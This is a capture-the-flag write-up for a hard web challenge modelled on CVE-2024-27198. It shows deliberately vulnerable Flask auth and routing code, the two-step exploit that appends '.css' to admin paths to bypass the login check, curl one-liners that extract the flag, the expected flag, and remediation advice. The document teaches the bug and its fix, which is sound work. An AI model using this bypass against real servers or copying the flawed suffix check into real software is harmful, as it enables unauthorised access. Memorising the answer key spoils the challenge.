# stadium_ci — Writeup

**Category:** Web · **Difficulty:** Hard
**CVE reference:** [CVE-2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198) — JetBrains TeamCity authentication bypass via URL parser differential.

This challenge is a small, self-contained reproduction of the *class* of bug
that CVE-2024-27198 represents: the HTTP auth gate and the request router
parse (or normalize) the same URL slightly differently, and the attacker slips
a request through the gap.

---

## 1. Recon

- `/` — public landing page, mentions "VAR room admin console" and "legacy
  Varnish edge cache".
- `/login` — form, takes public scout credentials `scout` / `scout`.
- `/dashboard` — public build dashboard with flavour text pointing at
  `/admin` for the sealed decision reports.
- `/admin` — returns **403 VAR Access Denied**, telling you the path is
  restricted to authenticated referees.
- `/robots.txt` — interesting:

  ```
  User-agent: *
  Disallow: /admin/
  Allow: /admin/*.css
  Allow: /admin/*.js
  ```

The `Allow` lines are the hint. The operator is explicitly telling crawlers
that `/admin/*.css` and `/admin/*.js` are reachable. Why would any CSS live
under `/admin/` in the first place?

## 2. The bug — static-asset auth gap

Reading the app reveals a classic URL parser differential between two layers:

### Layer A — `@app.before_request` auth gate

```python
STATIC_EXT = (".css", ".js", ".svg", ".ico", ".map", ".woff", ".woff2", ".png")

@app.before_request
def auth_gate():
    path = request.path
    if path.endswith(STATIC_EXT):
        return None                 # (1) static asset — skip auth entirely
    if _is_admin_path(path):
        if session.get("role") != "admin":
            return render_template("403.html", path=path), 403
```

The intent is "let the edge cache serve `/static/app.css` without hitting
auth". The implementation is overbroad: it trusts *any* path that happens to
end in a static extension, including paths under `/admin/`.

### Layer B — admin router normalization

```python
@app.route("/admin/<path:subpath>", methods=["GET", "POST"])
def admin_router(subpath):
    clean = _strip_static_suffix(subpath)   # (2) strip .css/.js/... and
                                            #     dispatch on the canonical name
    if clean in ("", "dashboard"):
        return render_template("admin_dashboard.html", ...)
    if clean == f"reports/{REPORT_ID}":
        return render_template("admin_report.html", flag=load_flag(), ...)
```

The router does the *opposite* of the gate: it strips the static extension
off and dispatches to the original, sensitive handler.

### The differential

|              | Gate sees                     | Router dispatches on |
|--------------|-------------------------------|-----------------------|
| `/admin/dashboard`        | `/admin/dashboard`  (protected) | `dashboard` |
| `/admin/dashboard.css`    | static — **no auth**            | `dashboard` ← **same handler**, unauth |

Both strip the same suffix, but only the router runs after the gate has
already been bypassed. The admin dashboard handler runs with no authenticated
role, producing the same output it would for a real admin.

## 3. Exploit chain

### Step 1 — reach the admin dashboard unauthenticated

```
GET /admin/dashboard.css HTTP/1.1
Host: <ctf-host>:8008
```

The gate sees `.css`, returns `None` (allow). The router strips `.css`,
matches `dashboard`, and renders `admin_dashboard.html`. The response
contains the full admin console, including a line that leaks the sealed
final-match report path:

```
Final match sealed decision — /admin/reports/infodays-final-2026
```

### Step 2 — reach the sealed report unauthenticated

Apply the same trick to the now-known report URL:

```
GET /admin/reports/infodays-final-2026.css HTTP/1.1
Host: <ctf-host>:8008
```

The gate allows `.css`. The router strips `.css`, matches
`reports/infodays-final-2026`, reads `/flag.txt` and returns it inside the
admin report template.

### One-liners

```bash
# Dump the admin dashboard and grep the report ID
curl -s http://<host>:8008/admin/dashboard.css | grep -oE '/admin/reports/[a-zA-Z0-9-]+'

# Pop the flag
curl -s http://<host>:8008/admin/reports/infodays-final-2026.css | grep -oE 'INFODAYS\{[^}]+\}'
```

Expected output:

```
INFODAYS{SaamNoLimits_you_can_overcome_anything_if_you_love_it_enough_<random-hex>}
```

## 4. Why Hard (and not Medium)

- The bug is not a single payload — it's a *chain*: bypass to enumerate, then
  bypass again on a path you had to pull from the leaked dashboard.
- The bypass itself requires spotting that two layers parse URLs
  asymmetrically. Players who have never seen CVE-2024-27198, URL parser
  differentials, or CDN auth gaps will not find this in five minutes.
- `robots.txt` is a deliberate hint (real ops teams publish them too), but
  understanding *why* the Allow rules let you through the auth gate still
  requires mentally modelling the two layers.
- The flag is not in a predictable location — you must read the admin
  dashboard (via the bypass) to learn the final-match report path, then apply
  the bypass again.
- No source code is provided to the player. They must infer the differential
  from black-box behaviour (406s, 403s, response sizes).

## 5. Remediation

- Never trust URL suffixes as authentication signals. Serve static assets
  from a dedicated namespace (`/static/*`) and enforce that at the gateway.
- If you must normalize URLs, do it **once**, at the outermost layer, and
  feed the canonical value into both the auth middleware and the router.
- When reviewing middleware, diff the parsing logic of every layer that
  touches `request.path` — auth, routing, rate limiting, logging.

## 6. Related reading

- <https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/>
- <https://orange.tw/posts/2018-08-hitcon-ctf-2018/> — classic writeup on URL
  parser differentials in Python frameworks.
- James Kettle, "Practical HTTP Host header attacks" — adjacent class of bug
  where layers disagree on the request line.
